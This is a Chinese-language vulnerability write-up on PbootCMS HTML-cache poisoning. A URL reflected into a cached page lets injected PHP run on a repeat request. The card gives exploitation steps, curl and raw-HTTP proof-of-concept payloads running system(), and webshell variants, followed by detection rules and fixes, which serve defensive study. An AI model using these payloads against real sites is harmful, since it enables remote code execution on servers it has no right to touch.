---
id: web-php-rce-pbootcms-html-cache-poisoning-rce
title: PbootCMS 前台 URL 反射进 Spider 脚本并写入 HTML 缓存，二次命中解释执行 PHP
type: scenario
domain: web
path: web/php/rce
technique: html-cache-poisoning-php-code-execution
aliases:
- PbootCMS HTML 缓存投毒 RCE
- PbootCMS 缓存投毒到代码执行
- runtime/cache PHP 片段执行
- Spider 记录反射缓存
tags:
- php
- pbootcms
- cms
- cache-poisoning
- rce
- reflected-into-cache
- spiderlog
- html-cache
cve: []
severity: critical
confidence: high
affected_versions: V3.2.5 - V3.2.13（3.2.13-20260525 已动态复现）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:44:10+08:00'
  notes: 已对照原文与4张截图核对：img/01 真实栏目 /?p=/aboutus/ 正常返回；img/02 页面底部 Spider script 的 url= 带出 ?p=/aboutus/&s=<payload>（截图中 payload 显示为 %3C?=/**/system(%22whoami%22);?%3E 的 URL 编码形式）；img/03 第二次请求同位置变为 www-data 两行（system 输出+<?= 二次输出）；img/04 Python PoC 输出 RCE confirmed 并列出 LICENSE/README.md/admin.php 等目录内容。卡片对 IndexController::_empty、ParserController spiderlog、Url::home case 3、View::cache 的 !query_string('p,s')、handle.php query_string、Controller::cache 在 gzip 前写盘、config/config.php 默认 tpl_html_cache=1/spiderlog 空启用/url_rule_type=3 的引用均与原文一致；impact V3.2.5-V3.2.13（3.2.13-20260525 动态复现）与原文影响范围一致。未验证点：原文/卡片称缓存文件内为原始 PHP 片段且 URL 无编码，但 img/02 显示的是 URL 编码后的 %3C?=...%3E；缓存命中时“解释执行”的具体 include/编译代码位置原文未给出，卡片已明确注明以动态复现结果为证据。raw request-target 与 REQUEST_URI 编码导致缓存键一致性的细节建议后续复核。未在本机复现。
---

## 一句话结论

PbootCMS 开启 HTML 缓存和 Spider 记录时，会把当前请求 URL 原样拼进页面底部的 `<script src='/?Spider/&url=<URL>'>`；缓存逻辑又恰好把承载 payload 的 `p`、`s` 参数当作可忽略参数，于是含 `<?=system(...)?>` 的整页 HTML 被写入 `runtime/cache/*.html`，第二次请求命中缓存后该 PHP 片段被服务端解释执行，形成匿名前台 RCE。

## 原理

这条链由四段各自“看起来正常”的逻辑串成。

1. **路由入口**：`apps/home/controller/IndexController::_empty()` 在 `url_rule_type=3`（兼容模式，默认值）下，把 `P` 参数或 `/?栏目/` 的 query-key 识别为前台路径。只有命中真实栏目，后续模板渲染、Spider 记录、缓存写入才会发生，所以“打对路由”是链路前提而不是复现细节。
2. **URL 反射进页面**：`ParserController` 在 `spiderlog !== '0'` 且 `tpl_html_cache` 开启时，执行
   `$spidercode = "<script src='" . Url::home('Spider', null, 'url=' . URL) . "' async='async'></script>";`
   再 `preg_replace` 插到 `</body>` 前。`URL` 是完整请求 URI（含 query string），没有任何 HTML 属性编码或 URL 编码。兼容模式下 `Url::home()` 生成 `/?Spider/&url=<当前URL>`，因此 `?s=` 里写的 `<?=...?>` 会原样落进 script 的 `src` 属性。
3. **缓存条件放过 payload**：`core/view/View::cache()` 仅在 `! query_string('p,s')` 时写缓存。`query_string('p,s')` 先 `unset` 掉 `p` 和 `s` 再判断是否还有剩余参数；若请求只有 `p`（或兼容路由 key）加 `s`，删除后为空，条件成立，整页内容被 `file_put_contents()` 写入 `runtime/cache/<md5>.html`。也就是说，payload 明明在 query string 里，缓存策略却把承载它的两个参数当成了“可忽略参数”。缓存键由 `md5(get_http_url().$_SERVER["REQUEST_URI"].$lg.$wap)` 决定，所以两次请求的 URI 必须完全一致才能命中同一文件。写入发生在 gzip 之前，缓存文件保存的是可直接阅读的原始 HTML。
4. **缓存命中被当 PHP 处理**：缓存文件是 `.html` 但位于站点目录内，命中后这段内容会被服务端重新处理，其中的 `<?= ... ?>` 被 PHP 解释。第一次请求在缓存文件里看到的是原始 `<?=/**/system("whoami");?>`，第二次同一请求响应同一位置变成命令输出（`whoami` 因 `system()` 直接打印 + `<?=` 再次输出而出现两次），证明是解释执行而非纯文本回传。原文未给出“命中时 include/编译缓存文件”的具体代码位置，该段以动态复现结果为证据。

默认配置放大了利用面：`config/config.php` 把 `tpl_html_cache` 设为 1（框架默认 `core/convention.php` 反而是 0）；后台模板中 `spiderlog` 为空时落在“启用”分支；SQL 备份中 `url_rule_type` 默认 3。三者叠加使默认部署即可命中链路。

## 触发条件

- PbootCMS 受影响版本，`config/config.php` 中 `tpl_html_cache=1`（项目默认）。
- `spiderlog` 未显式禁用（默认空值即启用）。
- `url_rule_type=3` 兼容模式（默认），且请求命中了真实存在的栏目/路由。
- `runtime/cache/` 可写（默认安装通常要求 777）。
- PHP 短标签 `<?=` 可用（PHP 5.4+ 恒开）。
- 需要连续两次完全相同的原始请求；浏览器会自动 URL 编码 `<?`，必须用 curl/脚本发送原始 request-target。

## 利用步骤

1. 确认目标为 PbootCMS，并找到一个真实前台路由（如默认演示站的“公司简介” `/?p=/aboutus/`）；返回 200 但不命中栏目时不会写入目标页缓存。
2. 可选：清理 `runtime/cache/*.html`（需服务器权限）避免旧缓存干扰。
3. 发送第一次请求，payload 放在 `s` 参数，`p` 指向真实路由：`GET /?p=/aboutus/&s=<?=/**/system("whoami");?>`。响应尾部出现被污染的 Spider 脚本，`runtime/cache/*.html` 中出现同样的原始 PHP 片段。
4. 用完全相同的 URI 发送第二次请求，缓存命中，响应里同一位置变为命令输出。
5. 换命令时注意缓存键含完整 URI，命令变化会生成新缓存文件，仍需“先铺后触发”两次请求。

## PoC

原文环境：Docker + `php:7.4-apache-bullseye` + Apache rewrite，复现版本 `3.2.13-20260525`。

最小原始 HTTP（必须原样发送，不能 URL 编码 PHP 标签）：

```http
GET /?p=/aboutus/&s=<?=/**/system("whoami");?> HTTP/1.1
Host: target
```

等价 curl（`--path-as-is` 防止 curl 归一化，`?` `<` 需按原样进入 query）：

```bash
curl -s --path-as-is 'http://target/?p=/aboutus/&s=<?=/**/system("whoami");?>'
curl -s --path-as-is 'http://target/?p=/aboutus/&s=<?=/**/system("whoami");?>'
```

成功标志：第二次响应对应位置不再是 `<?=...?>`，而是命令结果；原文 `whoami` 输出 `www-data` 出现两次（`system` 直接输出 + `<?=` 再输出一次）。原文另提供 Python PoC：预热取 Cookie、发送原始 poisoning 请求、重复请求触发，并从 `<script ... Spider ... &s=(.*?)' async=>` 提取 `s=` 值作为证据。

## 变体与关联

- 路由形态变体：`/?p=/aboutus/&s=...`、`/?aboutus/&s=...`、`/aboutus/?s=...` 都可能命中栏目，但缓存键含 `REQUEST_URI`，一次利用内必须固定同一种写法。
- 变体：payload 不限于 `system`，任意 PHP 代码均可，包括写文件落 WebShell、读文件等。
- 关联：[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（同一 CMS 的另一条 PHP 代码执行链，入口是模板表达式而非缓存）；[[web-php-rce-foxcms-taglib-id-code-injection]]（同为 CMS 模板/编译产物导致代码执行）；[[web-generic-cache-poisoning-web-cache-deception-url-normalization-mismatch]]（缓存键与归一化错位的通用思路）。
- 边界：关闭 `tpl_html_cache`、显式 `spiderlog=0`、清理 `runtime/cache`、边界层拦截 PHP 标签均可阻断；若缓存文件改为按纯文本读取输出则不成立。

## 检测与防御

- 检测：请求 query string 中出现 `<?`、`<?=`、`system(`、`assert(`、`eval(` 等 PHP 代码特征，尤其是 `s=` 参数；同时观察 `p`/`s` 两参数组合的重复请求。
- 检测：`runtime/cache/*.html` 中出现 PHP 标签；同一 URI 第二次响应内容与首次不同（命令输出替换了 payload）。
- 防御（根修）：缓存文件按纯文本读取输出，不要解释执行，例如 `readfile($cacheFile)` 或 `echo file_get_contents($cacheFile)`。
- 防御：对 Spider 的 `url=` 先 `rawurlencode(URL)` 再做 `htmlspecialchars(..., ENT_QUOTES)`，避免 HTML 属性逃逸与代码注入。
- 防御：收紧缓存写入条件，默认不缓存带 query string 的前台请求，或采用参数白名单；`p`、`s` 不应携带原始值进入缓存链路。
- 缓解：关闭 `tpl_html_cache`、显式 `spiderlog=0`、清空 `runtime/cache`、WAF 拦截 PHP 标签特征；这些只是缓解，缓存仍可被污染且仍被解释时风险未消除。
